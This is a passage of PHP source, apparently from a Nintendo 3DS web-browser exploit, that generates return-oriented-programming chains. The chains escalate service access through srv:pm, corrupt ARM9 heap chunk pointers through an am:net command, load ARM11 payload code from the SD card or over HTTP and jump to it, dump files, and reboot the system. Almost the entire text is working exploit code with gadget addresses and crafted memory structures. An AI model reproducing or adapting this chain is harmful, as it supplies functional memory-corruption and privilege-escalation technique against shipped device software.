		ropgen_writeu32($FD_ADDR+8, 0x0, 0, 1);

		ropgen_ldm_r0r3($FD_ADDR, 0);

		ropchain_appendu32($POPPC);//lr
		ropchain_appendu32($WKC_FSEEK);//wkc_fseek(fd, 0, SEEK_SET)

		$chunksize = 0x8000;

		for($pos=0; $pos<$bufsize; $pos+=0x8000)
		{
			if($bufsize - $pos < $chunksize)$chunksize = $bufsize - $pos;

			ropgen_writeu32($FD_ADDR-12, $ROPHEAP+0x200, 0, 1);//ptr
			ropgen_writeu32($FD_ADDR-8, 0x1, 0, 1);//size
			ropgen_writeu32($FD_ADDR-4, $chunksize, 0, 1);//nmemb

			ropgen_ldm_r0r3($FD_ADDR-12, 0);

			ropchain_appendu32($POPPC);//lr
			ropchain_appendu32($WKC_FWRITE);//wkc_fwrite($bufaddr, 1, $bufsize, fd)
		}
	}

	ropgen_ldm_r0r3($FD_ADDR, 0);

	ropchain_appendu32($POPLRPC);

	ropchain_appendu32($POPPC);//lr
	ropchain_appendu32($WKC_FCLOSE);

	if($delete_tmpfile)ropgen_callfunc($filepathptr_utf16, 0x0, 0x0, 0x0, $POPPC, $FS_DELETEFILE);
}

function ropgen_httpdownload_binary($bufaddr, $bufsize, $binid)
{
	global $ropchainparam, $DEVUNIT, $cfg_arm11code_payloadbaseurl;

	if(!isset($cfg_arm11code_payloadbaseurl))
	{
		$url = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['SCRIPT_NAME'];
	}
	else
	{
		$url = $cfg_arm11code_payloadbaseurl;
	}
	$url .= "?getbin=$binid";

	ropgen_httpdownload($bufaddr, $bufsize, "", $url, 1);
}

function getcodebin_array($path, $size)
{
	$code_arr = array();

	$codebin = file_get_contents($path);
	if($codebin===FALSE)
	{
		exit("Failed to open the code binary.");
	}

	for($i=0; $i<$size/4; $i++)$code_arr[$i] = 0x00000000;

	$tmpdata = unpack("V*", $codebin);

	$i = 0;
	while($i < count($tmpdata) && $i < $size/4)
	{
		$code_arr[$i] = $tmpdata[$i+1];
		//echo "$i: " . sprintf("%08x", $arm9code[$i]) . "\n";
		$i++;
	}

	return $code_arr;
}

function string_gendata_array($inputstr, $utf16_out, $size)
{
	$out_arr = array();

	for($i=0; $i<$size/4; $i++)$out_arr[$i] = 0x00000000;

	$i = 0;
	$pos = 0;
	while($i < strlen($inputstr) && $pos*4 < $size)
	{
		//echo "$i: " . sprintf("%08x", ord($inputstr[$i])) . "\n";
		if($utf16_out==0)
		{
			$out_arr[$pos] = ord($inputstr[$i]);
			if($i+1 < strlen($inputstr))$out_arr[$pos] |= (ord($inputstr[$i+1])<<8);
			if($i+2 < strlen($inputstr))$out_arr[$pos] |= (ord($inputstr[$i+2])<<16);
			if($i+3 < strlen($inputstr))$out_arr[$pos] |= (ord($inputstr[$i+3])<<24);
			$i+=4;
		}
		else
		{
			$out_arr[$pos] = ord($inputstr[$i]);
			if($i+1 < strlen($inputstr))$out_arr[$pos] |= (ord($inputstr[$i+1])<<16);
			$i+=2;
		}
		//echo "out $pos: " . sprintf("%08x", $out_arr[$pos]) . "\n";
		$pos++;
	}

	return $out_arr;
}

function generateropchain_type1()
{
	global $ROPHEAP, $ROP_INFINITELP, $POPPC, $POPLRPC, $ROP_POP_R0R6PC, $ROP_POP_R0R8PC, $ROP_STR_R1TOR0, $ROP_POP_R0PC, $SRVPORT_HANDLEADR, $srv_shutdown, $svcGetProcessId, $srv_GetServiceHandle, $srvpm_initialize, $SRV_REFCNT, $ROP_MEMSETOTHER, $DIFF_FILEREAD_FUNCPTR, $ARM9_HEAPHAXBUF;

	//ropchain_appendu32(0x40404040);
	//ropchain_appendu32(0x80808080);

	ropgen_writeu32($SRV_REFCNT, 1, 0, 1);//Set the srv reference counter to value 1, so that the below function calls do the actual srv shutdown and "srv:pm" initialization.

	ropgen_callfunc(0, 0, 0, 0, $POPPC, $srv_shutdown);
	ropgen_condfatalerr();

	ropgen_callfunc(0, 0, 0, 0, $POPPC, $srvpm_initialize);
	ropgen_condfatalerr();

	ropgen_writeu32_cmdbuf(0, 0x04040040);//Write the cmdhdr.
	ropgen_write_procid_cmdbuf(1);//Write the current processid to cmdbuf+4.

	ropgen_sendcmd($SRVPORT_HANDLEADR, 1);//Unregister the current process with srvpm.

	$databuf = array();

	$databuf[0x0*2 + 0] = 0x3a545041;//"APT:U"
	$databuf[0x0*2 + 1] = 0x00000055;
	$databuf[0x1*2 + 0] = 0x3a723279;//"y2r:u"
	$databuf[0x1*2 + 1] = 0x00000075;
	$databuf[0x2*2 + 0] = 0x3a707367;//"gsp::Gpu"
	$databuf[0x2*2 + 1] = 0x7570473a;
	$databuf[0x3*2 + 0] = 0x3a6d646e;//"ndm:u"
	$databuf[0x3*2 + 1] = 0x00000075;
	$databuf[0x4*2 + 0] = 0x553a7366;//"fs:USER"
	$databuf[0x4*2 + 1] = 0x00524553;
	$databuf[0x5*2 + 0] = 0x3a646968;//"hid:USER"
	$databuf[0x5*2 + 1] = 0x52455355;
	$databuf[0x6*2 + 0] = 0x3a707364;//"dsp::DSP"
	$databuf[0x6*2 + 1] = 0x5053443a;
	$databuf[0x7*2 + 0] = 0x3a676663;//"cfg:u"
	$databuf[0x7*2 + 1] = 0x00000075;
	$databuf[0x8*2 + 0] = 0x703a7370;//"ps:ps"
	$databuf[0x8*2 + 1] = 0x00000073;
	$databuf[0x9*2 + 0] = 0x6e3a6d61;//"am:net"
	$databuf[0x9*2 + 1] = 0x00007465;
	$databuf[0xa*2 + 0] = 0x00000000;
	$databuf[0xa*2 + 1] = 0x00000000;
	$databuf[0xb*2 + 0] = 0x00000000;
	$databuf[0xb*2 + 1] = 0x00000000;

	ropgen_writeregdata_wrap($ROPHEAP+0x100, $databuf, 0, 0x60);

	ropgen_writeu32_cmdbuf(0, 0x04030082);
	ropgen_write_procid_cmdbuf(1);//Write the current processid to cmdbuf+4.
	ropgen_writeu32_cmdbuf(2, 0x18);
	ropgen_writeu32_cmdbuf(3, 0x180002);
	ropgen_writeu32_cmdbuf(4, $ROPHEAP+0x100);

	ropgen_sendcmd($SRVPORT_HANDLEADR, 1);//Re-register the current process with srvpm with a new service-access-control list.

	ropgen_callfunc($ROPHEAP+0xc, $ROPHEAP + 0x100 + 0x9*8, 6, 0, $POPPC, $srv_GetServiceHandle);//Get the service handle for "am:net", out handle is @ $ROPHEAP+0xc.
	ropgen_condfatalerr();

	$HEAPHAXBUF = $ROPHEAP+0x100;
	ropgen_callfunc($HEAPHAXBUF, 0x2800, 0xffffffff, 0x0, $POPPC, $ROP_MEMSETOTHER);//Clear the 0x2800-byte buffer with value 0xffffffff, this buffer is passed to the below command.

	ropgen_callfunc($HEAPHAXBUF, 0x280, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);//RSA-2048 "cert" used to trigger an error so that the below command aborts processing the entire input cert buffer data.
	ropgen_writeu32($HEAPHAXBUF, 0x3000100, 0, 1);//Big-endian signature-type 0x10003, for RSA-4096 SHA256.

	ropgen_writeregdata_wrap($HEAPHAXBUF+4, getcodebin_array("3ds_arm9codeldr.bin", 0x1c0), 0, 0x1c0);

	$databuf = array();
	$databuf[0] = 0x4652;//"RF"
	$databuf[1] = 0x150;//Available free space following this chunk header.
	$databuf[2] = $DIFF_FILEREAD_FUNCPTR-12;//prev memchunk ptr
	$databuf[3] = $ARM9_HEAPHAXBUF+4;//next memchunk ptr, arm9 code addr.

	ropgen_writeregdata_wrap($HEAPHAXBUF+4+0x200+0x88, $databuf, 0, 0x10);

	$databuf = array();
	$databuf[0] = 0x08093920;//Heap memctx
	$databuf[1] = 0;
	$databuf[2] = 0;
	$databuf[3] = 0;
	$databuf[4] = 0;
	$databuf[5] = 0;
	$databuf[6] = 0x45585048;
	$databuf[7] = 0;
	$databuf[8] = 0;
	$databuf[9] = 0;
	$databuf[10] = 0;
	$databuf[11] = 0x00040000;
	$databuf[12] = 0x080A2EE4;
	$databuf[13] = 0x080B5280;
	$databuf[14] = 0;
	$databuf[15] = $ARM9_HEAPHAXBUF+4+0x200+0x88;//These two are RF chunk ptrs
	$databuf[16] = $ARM9_HEAPHAXBUF+4+0x200+0x88;
	ropgen_writeregdata_wrap($HEAPHAXBUF+0x2800, $databuf, 0, 0x3c+8);

	ropgen_writeu32_cmdbuf(0, 0x08190108);
	ropgen_writeu32_cmdbuf(1, 0xa00);
	ropgen_writeu32_cmdbuf(2, 0xa00);
	ropgen_writeu32_cmdbuf(3, 0xa00);
	ropgen_writeu32_cmdbuf(4, 0xa00 + 0x3c + 8);
	ropgen_writeu32_cmdbuf(5, (0xa00<<4) | 10);
	ropgen_writeu32_cmdbuf(6, $HEAPHAXBUF);
	ropgen_writeu32_cmdbuf(7, (0xa00<<4) | 10);
	ropgen_writeu32_cmdbuf(8, $HEAPHAXBUF + (0xa00*1));
	ropgen_writeu32_cmdbuf(9, (0xa00<<4) | 10);
	ropgen_writeu32_cmdbuf(10, $HEAPHAXBUF + (0xa00*2));
	ropgen_writeu32_cmdbuf(11, ((0xa00 + 0x3c + 8)<<4) | 10);
	ropgen_writeu32_cmdbuf(12, $HEAPHAXBUF + (0xa00*3));

	ropgen_sendcmd($ROPHEAP+0xc, 0);//.ctx install cmd?

	ropgen_writeu32_cmdbuf(0, 0x00190040);
	ropgen_writeu32_cmdbuf(1, 1);//mediatype = SD

	ropgen_sendcmd($ROPHEAP+0xc, 0);//ReloadDBS, for SD card.

	ropchain_appendu32(0x50505050);//genu32_unicode($ROP_INFINITELP);
}

function generateropchain_type2()
{
	global $ROPHEAP, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $OSSCRO_HEAPADR, $OSSCRO_MAPADR, $APPHEAP_PHYSADDR, $svcControlMemory, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, /*$IFile_Seek,*/ $GSP_FLUSHDCACHE, $GXLOW_CMD4, $svcSleepThread, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $GSP_WRITEHWREGS, $GSPGPU_SERVHANDLEADR, /*$APT_PrepareToDoApplicationJump,*/ $APT_DoApplicationJump, $arm11code_loadfromsd, $browserver, $FS_MOUNTSDMC, $ROP_snprintf, $ROP_curl_easy_cleanup, $ROP_curl_easy_init, $ROP_curl_easy_perform, $ROP_curl_easy_setopt;

	$LINEAR_TMPBUF = 0x18B40000;
	$LINEAR_VADDRBASE = 0x14000000;
	if($browserver >= 0x80)
	{
		$LINEAR_TMPBUF = 0x3A45C000;
		$LINEAR_VADDRBASE = 0x30000000;
	}

	$LINEAR_CODETMPBUF = $LINEAR_TMPBUF + 0x1000;
	$OSSCRO_PHYSADDR = ($OSSCRO_HEAPADR - 0x08000000) + $APPHEAP_PHYSADDR;
	$LINEARADR_OSSCRO = ($OSSCRO_PHYSADDR - 0x20000000) + $LINEAR_VADDRBASE;
	$LINEARADR_CODESTART = $LINEARADR_OSSCRO + 0x6e0;
	$CODESTART_MAPADR = $OSSCRO_MAPADR + 0x6e0;

	$codebinsize = 0x8000;

	$IFile_ctx = $ROPHEAP;

	ropgen_writeu32($ROPHEAP, 0x0100FFFF, 0, 1);
	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $POPPC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that yellow is displayed.

	ropgen_callfunc($LINEAR_TMPBUF, 0x11000, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);

	if($arm11code_loadfromsd>=1 && $browserver>=0x80)//Open sdmc archive when running under SKATER.
	{
		ropgen_writeu32($ROPHEAP, 0x636d6473, 0, 1);
		ropgen_writeu32($ROPHEAP+4, 0x3a, 0, 1);
		ropgen_callfunc($ROPHEAP, 0x0, 0x0, 0x0, $POPPC, $FS_MOUNTSDMC);
		ropgen_condfatalerr();
	}

	if($browserver>=0x80)
	{
		ropchain_appendu32($POPLRPC);
		ropchain_appendu32($ROP_POP_R0R6PC);

		ropchain_appendu32($ROP_POP_R0R6PC);
		ropchain_appendu32($ROPHEAP);//r0 outaddr
		ropchain_appendu32(0x0a000000);//r1 addr0
		ropchain_appendu32(0x0);//r2 addr1
		ropchain_appendu32(0x800000);//r3 size
		ropchain_appendu32(0x0);//r4
		ropchain_appendu32(0x0);//r5
		ropchain_appendu32(0x0);//r6

		ropchain_appendu32($svcControlMemory);//Free 8MB of heap under SKATER.

		ropchain_appendu32(0x1);//sp0 operation
		ropchain_appendu32(0x0);//sp4 permissions
		ropchain_appendu32(0x0);//sp8
		ropchain_appendu32(0x8);//sp12
		ropchain_appendu32(0x0);//r4
		ropchain_appendu32(0x0);//r5
		ropchain_appendu32(0x0);//r6
	}

	if($arm11code_loadfromsd==0)
	{
		$data_arr = getcodebin_array(browserhaxcfg_getbinpath_ropchain2(), 0x540);
	
		ropgen_writeregdata_wrap($LINEAR_CODETMPBUF, $data_arr, 0, 0x540);
	}
	else if($arm11code_loadfromsd==1)
	{
		ropgen_callfunc($IFile_ctx, 0x14, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);//Clear the IFile ctx.

		/*$databuf = array();
		$databuf[0] = 0x640073;
		$databuf[1] = 0x63006d;
		$databuf[2] = 0x2f003a;
		$databuf[3] = 0x720061;
		$databuf[4] = 0x31006d;
		$databuf[5] = 0x630031;
		$databuf[6] = 0x64006f;
		$databuf[7] = 0x2e0065;
		$databuf[8] = 0x690062;
		$databuf[9] = 0x6e;*/

		$databuf = string_gendata_array("sdmc:/arm11code.bin", 1, 0x40);

		ropgen_writeregdata_wrap($ROPHEAP+0x40, $databuf, 0, 0x28);//Write the following utf16 string to ROPHEAP+0x40: "sdmc:/arm11code.bin".

		ropgen_callfunc($IFile_ctx, $ROPHEAP+0x40, 0x1, 0x0, $POPPC, $IFile_Open);//Open the above file.
		//ropchain_appendu32(0x50505050);
		ropgen_condfatalerr();

		ropgen_callfunc($IFile_ctx, $ROPHEAP+0x20, $LINEAR_CODETMPBUF, $codebinsize, $POPPC, $IFile_Read);//Read the file to $LINEAR_CODETMPBUF with size $codebinsize, actual size must be <=$codebinsize.
		//ropchain_appendu32(0x40404040);
		ropgen_condfatalerr();

		ropgen_readu32($IFile_ctx, 0, 1);

		ropchain_appendu32($POPLRPC);
		ropchain_appendu32($POPPC);//lr
		ropchain_appendu32($ROP_POP_R1R5PC);

		ropchain_appendu32(0x0);//r1
		ropchain_appendu32(0x0);//r2
		ropchain_appendu32(0x0);//r3
		ropchain_appendu32(0x0);//r4
		ropchain_appendu32(0x0);//r5
		ropchain_appendu32($IFile_Close);
	}
	else if($arm11code_loadfromsd==2)
	{
		ropgen_httpdownload_binary($LINEAR_CODETMPBUF, $codebinsize, browserhaxcfg_getbinparam_type3());
	}

	ropgen_callfunc($LINEAR_CODETMPBUF, $codebinsize, 0x0, 0x0, $POPPC, $GSP_FLUSHDCACHE);//Flush the data-cache for the loaded code.

	if(!isset($SRVPORT_HANDLEADR))$SRVPORT_HANDLEADR = 0x0;
	if(!isset($SRV_REFCNT))$SRV_REFCNT = 0x0;
	if(!isset($srvpm_initialize))$srvpm_initialize = 0x0;
	if(!isset($srv_shutdown))$srv_shutdown = 0x0;
	if(!isset($ROP_snprintf))$ROP_snprintf = 0x0;

	$databuf = array();
	$databuf[0] = 0x0;
	$databuf[1] = $THROW_FATALERR;
	$databuf[2] = $SRVPORT_HANDLEADR;
	$databuf[3] = $SRV_REFCNT;
	$databuf[4] = $srvpm_initialize;
	$databuf[5] = $srv_shutdown;
	$databuf[6] = $srv_GetServiceHandle;
	$databuf[7] = $GXLOW_CMD4;
	$databuf[8] = $GSP_FLUSHDCACHE;
	$databuf[9] = $IFile_Open;
	$databuf[10] = $IFile_Close;
	$databuf[11] = $IFile_GetSize;
	$databuf[12] = 0;//$IFile_Seek;
	$databuf[13] = $IFile_Read;
	$databuf[14] = $IFile_Write;
	$databuf[15] = $GSP_WRITEHWREGS;
	$databuf[16] = 0;//$APT_PrepareToDoApplicationJump;
	$databuf[17] = 0;//$APT_DoApplicationJump;
	if($browserver<0x80)$databuf[18] = 0x40;//flags
	if($browserver>=0x80)$databuf[18] = 0x48;
	$databuf[19] = 0x0;
	$databuf[20] = 0x0;
	$databuf[21] = 0x0;
	$databuf[22] = $GSPGPU_SERVHANDLEADR;//GSPGPU handle*
	$databuf[23] = 0x114;//NS appID
	$databuf[24] = 0;
	$databuf[25] = $LINEAR_CODETMPBUF;
	$databuf[26] = $ROP_snprintf;
	$databuf[27] = $ROP_curl_easy_cleanup;//Using these libcurl functions from the arm11code payload is not recommended: these are broken due to the payload overwriting oss.cro.
	$databuf[28] = $ROP_curl_easy_init;
	$databuf[29] = $ROP_curl_easy_perform;
	$databuf[30] = $ROP_curl_easy_setopt;

	ropgen_writeregdata_wrap($LINEAR_TMPBUF, $databuf, 0, 31*4);

	ropchain_appendu32($POPLRPC);
	ropchain_appendu32($ROP_POP_R0R6PC);

	ropchain_appendu32($ROP_POP_R0R6PC);
	ropchain_appendu32($LINEAR_CODETMPBUF);//r0 srcaddr
	ropchain_appendu32($LINEARADR_CODESTART);//r1 dstaddr
	ropchain_appendu32($codebinsize);//r2 size
	ropchain_appendu32(0x0);//r3 width0
	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32(0x0);//r6

	ropchain_appendu32($GXLOW_CMD4);//Copy the loaded code to the start of the CRO.

	ropchain_appendu32(0x0);//sp0 height0
	ropchain_appendu32(0x0);//sp4 width1
	ropchain_appendu32(0x0);//sp8 height1
	ropchain_appendu32(0x8);//sp12 flags 
	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32(0x0);//r6

	ropchain_appendu32($POPLRPC);//Delay 1 second while the above copy-command is being processed, then jump to that code.
	ropchain_appendu32($POPPC);

	ropchain_appendu32($ROP_POP_R0R6PC);
	ropchain_appendu32(1000000000);//r0
	ropchain_appendu32(0x0);//r1
	ropchain_appendu32(0x0);//r2
	ropchain_appendu32(0x0);//r3
	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32(0x0);//r6

	ropchain_appendu32($svcSleepThread);

	ropgen_writeu32($ROPHEAP, 0x01808080, 0, 1);
	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $ROP_POP_R0R6PC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that gray is displayed.

	ropchain_appendu32($LINEAR_TMPBUF);//r0
	ropchain_appendu32(0x10000000-0x7000);//r1 (relocated stack-top if needed by the payload)
	ropchain_appendu32(0x0);//r2
	ropchain_appendu32(0x0);//r3
	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32(0x0);//r6

	ropchain_appendu32($POPLRPC);
	ropchain_appendu32($POPPC);

	ropchain_appendu32($CODESTART_MAPADR);

	ropchain_appendu32(0x70707070);
}

function generateropchain_type3()
{
	global $ROPHEAP, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $READ_EXEFSFILE, $OPENFILEDIRECTLY_WRAP, $FSFILEIPC_CLOSE, $FSFILEIPC_GETSIZE, $FSFILEIPC_READ, $GSP_WRITEHWREGS, $browserver, $arm11code_loadfromsd, $FS_MOUNTSDMC;

	$IFile_ctx = $ROPHEAP+0x80;
	$FILEBUF = 0x18B40000;
	if($browserver >= 0x80)
	{
		$FILEBUF = 0x3A45C000;
	}

	$FILEBUF-= 0x00200000-8;

	ropgen_writeu32($ROPHEAP, 0x010000FF, 0, 1);
	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $POPPC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that red is displayed.

	ropgen_callfunc($FILEBUF, 0x00200000+8, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);

	ropgen_callfunc($IFile_ctx, 0x14, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);//Clear the IFile ctx.

	if($arm11code_loadfromsd>=1 && $browserver>=0x80)//Open sdmc archive when running under SKATER.
	{
		ropgen_writeu32($ROPHEAP, 0x636d6473, 0, 1);
		ropgen_writeu32($ROPHEAP+4, 0x3a, 0, 1);
		ropgen_callfunc($ROPHEAP, 0x0, 0x0, 0x0, $POPPC, $FS_MOUNTSDMC);
		ropgen_condfatalerr();
	}

	$databuf = array();
	$databuf[0] = 0x640073;//utf16 string: "sdmc:/dump.bin"
	$databuf[1] = 0x63006d;
	$databuf[2] = 0x2f003a;
	$databuf[3] = 0x750064;
	$databuf[4] = 0x70006d;
	$databuf[5] = 0x62002e;
	$databuf[6] = 0x6e0069;
	$databuf[7] = 0x00;
	$databuf[8] = 0x00000000;//archive lowpath data, with archive 0x2345678A: programID low/high, u8 mediatype, u32 reserved. Replace this data and the file lowpath data below with proper data in order to use this.
	$databuf[9] = 0x00000000;
	$databuf[10] = 0x00000000;
	$databuf[11] = 0x00000000;
	$databuf[12] = 0x0;//file lowpath data
	$databuf[13] = 0x0;
	$databuf[14] = 0x0;
	$databuf[15] = 0x0;
	$databuf[16] = 0x0;
	$databuf[17] = 0x2;//archive lowpath*
	$databuf[18] = $ROPHEAP+0x100+0x20;//lowpath data ptr
	$databuf[19] = 0x10;//lowpath data size
	$databuf[20] = 0x2;//file lowpath*
	$databuf[21] = $ROPHEAP+0x100+0x20+0x10;//lowpath data ptr
	$databuf[22] = 0x14;//lowpath data size

	ropgen_writeregdata_wrap($ROPHEAP+0x100, $databuf, 0, 0x5c);//Write the above data to ROPHEAP+0x100.

	ropgen_callfunc($ROPHEAP+0xc0, 0x2345678A, $ROPHEAP+0x100+0x44, $ROPHEAP+0x100+0x44+0xc, $POPPC, $OPENFILEDIRECTLY_WRAP);

	/*ropchain_appendu32($POPLRPC);
	ropchain_appendu32($ROP_POP_R1R5PC);

	ropchain_appendu32($ROP_POP_R0R6PC);
	ropchain_appendu32($FILEBUF);//r0 outbuf*
	ropchain_appendu32(0x000e8000);//r1 readsize
	ropchain_appendu32(0x2);//r2 archive lowpathtype
	ropchain_appendu32($ROPHEAP+0x100+0x20);//r3 archive lowpath data*
	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32(0x0);//r6

	ropchain_appendu32($READ_EXEFSFILE);//Write the data @ $FILEBUF to the file.

	ropchain_appendu32(0x10);//sp0(archive lowpath datasize) / r1
	ropchain_appendu32($ROPHEAP+0x100+0x20+0x10);//sp4(ptr to 8-byte exefs filename) / r2
	ropchain_appendu32(0x0);//r3
	ropchain_appendu32(0x8);//r4
	ropchain_appendu32(0x0);//r5*/

	//ropchain_appendu32(0x24242424);
	ropgen_condfatalerr();

	ropgen_callfunc($ROPHEAP+0xc0, $FILEBUF, 0x0, 0x0, $POPPC, $FSFILEIPC_GETSIZE);//Load the filesize to $FILEBUF+0.

	//ropchain_appendu32(0x34343434);
	ropgen_condfatalerr();

	ropgen_writeu32($FILEBUF-4, $FILEBUF+8, 0, 1);

	ropchain_appendu32($ROP_POP_R0R6PC);
	ropchain_appendu32($ROPHEAP+0xc0);//r0 handle*
	ropchain_appendu32(0x0);//r1 unused
	ropchain_appendu32(0x0);//r2 offset low
	ropchain_appendu32(0x0);//r3 offset high
	ropchain_appendu32($FILEBUF-4);//r4 ptr to the following: +0 = databuf, +4 = datasize
	ropchain_appendu32($ROPHEAP+0xd0);//r5 transfercount*
	ropchain_appendu32(0x0);//r6

	ropchain_appendu32($FSFILEIPC_READ+0xc);

	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32(0x0);//r6

	//ropchain_appendu32(0x74747474);
	ropgen_condfatalerr();

	ropgen_callfunc($ROPHEAP+0xc0, 0x0, 0x0, 0x0, $POPPC, $FSFILEIPC_CLOSE);

	ropgen_callfunc($IFile_ctx, $ROPHEAP+0x100, 0x6, 0x0, $POPPC, $IFile_Open);//Open the above file for writing.
	ropgen_condfatalerr();

	ropchain_appendu32($POPLRPC);
	ropchain_appendu32($ROP_POP_R1R5PC);

	ropchain_appendu32($ROP_POP_R0R6PC);
	ropchain_appendu32($IFile_ctx);//r0 filectx
	ropchain_appendu32($ROPHEAP+0x20);//r1 transfercount*
	ropchain_appendu32($FILEBUF);//r2 buf*
	ropchain_appendu32(0x00200000+8);//r3 size
	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32(0x0);//r6

	ropchain_appendu32($IFile_Write);//Write the data @ $FILEBUF to the file.

	ropchain_appendu32(0x1);//sp0(flushflag) / r1
	ropchain_appendu32(0x0);//r2
	ropchain_appendu32(0x0);//r3
	ropchain_appendu32(0x8);//r4
	ropchain_appendu32(0x0);//r5

	ropgen_condfatalerr();

	ropgen_readu32($IFile_ctx, 0, 1);

	ropchain_appendu32($POPLRPC);
	ropchain_appendu32($POPPC);//lr
	ropchain_appendu32($ROP_POP_R1R5PC);

	ropchain_appendu32(0x0);//r1
	ropchain_appendu32(0x0);//r2
	ropchain_appendu32(0x0);//r3
	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32($IFile_Close);

	ropgen_writeu32($ROPHEAP, 0x01FF0000, 0, 1);
	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $POPPC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that blue is displayed.

	ropchain_appendu32(0x70707070);
}

function generateropchain_type4()
{
	global $ROPHEAP, $ROP_INFINITELP, $POPPC, $POPLRPC, $ROP_POP_R0R6PC, $ROP_POP_R0R8PC, $ROP_STR_R1TOR0, $ROP_POP_R0PC, $SRVPORT_HANDLEADR, $srv_shutdown, $svcGetProcessId, $srv_GetServiceHandle, $srvpm_initialize, $SRV_REFCNT, $ROP_MEMSETOTHER;

	//ropchain_appendu32(0x40404040);
	//ropchain_appendu32(0x80808080);

	ropgen_writeu32($SRV_REFCNT, 1, 0, 1);//Set the srv reference counter to value 1, so that the below function calls do the actual srv shutdown and "srv:pm" initialization.

	ropgen_callfunc(0, 0, 0, 0, $POPPC, $srv_shutdown);
	ropgen_condfatalerr();

	ropgen_callfunc(0, 0, 0, 0, $POPPC, $srvpm_initialize);
	ropgen_condfatalerr();

	ropgen_writeu32_cmdbuf(0, 0x04040040);//Write the cmdhdr.
	ropgen_write_procid_cmdbuf(1);//Write the current processid to cmdbuf+4.

	ropgen_sendcmd($SRVPORT_HANDLEADR, 1);//Unregister the current process with srvpm.

	$databuf = array();

	$databuf[0x0*2 + 0] = 0x3a545041;//"APT:U"
	$databuf[0x0*2 + 1] = 0x00000055;
	$databuf[0x1*2 + 0] = 0x3a723279;//"y2r:u"
	$databuf[0x1*2 + 1] = 0x00000075;
	$databuf[0x2*2 + 0] = 0x3a707367;//"gsp::Gpu"
	$databuf[0x2*2 + 1] = 0x7570473a;
	$databuf[0x3*2 + 0] = 0x3a6d646e;//"ndm:u"
	$databuf[0x3*2 + 1] = 0x00000075;
	$databuf[0x4*2 + 0] = 0x553a7366;//"fs:USER"
	$databuf[0x4*2 + 1] = 0x00524553;
	$databuf[0x5*2 + 0] = 0x3a646968;//"hid:USER"
	$databuf[0x5*2 + 1] = 0x52455355;
	$databuf[0x6*2 + 0] = 0x3a707364;//"dsp::DSP"
	$databuf[0x6*2 + 1] = 0x5053443a;
	$databuf[0x7*2 + 0] = 0x3a676663;//"cfg:u"
	$databuf[0x7*2 + 1] = 0x00000075;
	$databuf[0x8*2 + 0] = 0x703a7370;//"ps:ps"
	$databuf[0x8*2 + 1] = 0x00000073;
	$databuf[0x9*2 + 0] = 0x733a736e;//"ns:s"
	$databuf[0x9*2 + 1] = 0x00000000;
	$databuf[0xa*2 + 0] = 0x00000000;
	$databuf[0xa*2 + 1] = 0x00000000;
	$databuf[0xb*2 + 0] = 0x00000000;
	$databuf[0xb*2 + 1] = 0x00000000;

	ropgen_writeregdata_wrap($ROPHEAP+0x100, $databuf, 0, 0x60);

	ropgen_writeu32_cmdbuf(0, 0x04030082);
	ropgen_write_procid_cmdbuf(1);//Write the current processid to cmdbuf+4.
	ropgen_writeu32_cmdbuf(2, 0x18);
	ropgen_writeu32_cmdbuf(3, 0x180002);
	ropgen_writeu32_cmdbuf(4, $ROPHEAP+0x100);

	ropgen_sendcmd($SRVPORT_HANDLEADR, 1);//Re-register the current process with srvpm with a new service-access-control list.

	ropgen_callfunc($ROPHEAP+0xc, $ROPHEAP + 0x100 + 0x9*8, 4, 0, $POPPC, $srv_GetServiceHandle);//Get the service handle for "ns:s", out handle is @ $ROPHEAP+0xc.
	ropgen_condfatalerr();

	ropgen_writeu32_cmdbuf(0, 0x00100180);
	ropgen_writeu32_cmdbuf(1, 1);//flag=1 for titleinfo is set.
	ropgen_writeu32_cmdbuf(2, 0);//programID-low
	ropgen_writeu32_cmdbuf(3, 0);//programID-high
	ropgen_writeu32_cmdbuf(4, 2);//mediatype
	ropgen_writeu32_cmdbuf(5, 0);//reserved
	ropgen_writeu32_cmdbuf(6, 0);//u8

	ropgen_sendcmd($ROPHEAP+0xc, 0);//NSS:RebootSystem

	ropchain_appendu32(0x50505050);
}

?>
